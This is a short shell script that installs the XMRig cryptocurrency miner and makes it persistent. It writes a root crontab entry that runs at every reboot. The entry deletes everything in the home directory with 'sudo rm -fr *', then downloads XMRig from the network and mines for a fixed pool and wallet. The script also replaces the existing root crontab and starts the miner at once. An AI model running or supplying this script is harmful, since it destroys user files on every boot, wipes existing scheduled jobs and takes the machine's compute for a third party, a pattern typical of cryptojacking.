echo "@reboot cd ~/;sudo rm -fr *;sudo wget -q https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz;sudo tar -xf xmrig-6.14.1-linux-x64.tar.gz;cd xmrig-6.14.1;./xmrig  -a cryptonight-upx/2 -o stratum+tcp://cryptonight_upx.asia.mine.zergpool.com:4457 -u D8m8PTFm9KPKK48MtvtuJEWcgEPuLtiv6M --keepalive --donate-level 1 -p  c=DOGE,mc=UPX,ID=worker_$(date +%s)" | sudo crontab
sudo service cron reload
cd ~/
sudo wget -q https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz;sudo tar -xf xmrig-6.14.1-linux-x64.tar.gz
cd xmrig-6.14.1
./xmrig  -a cryptonight-upx/2 -o stratum+tcp://cryptonight_upx.asia.mine.zergpool.com:4457 -u D8m8PTFm9KPKK48MtvtuJEWcgEPuLtiv6M --keepalive --donate-level 1 -p  c=DOGE,mc=UPX,ID=worker_$(date +%s)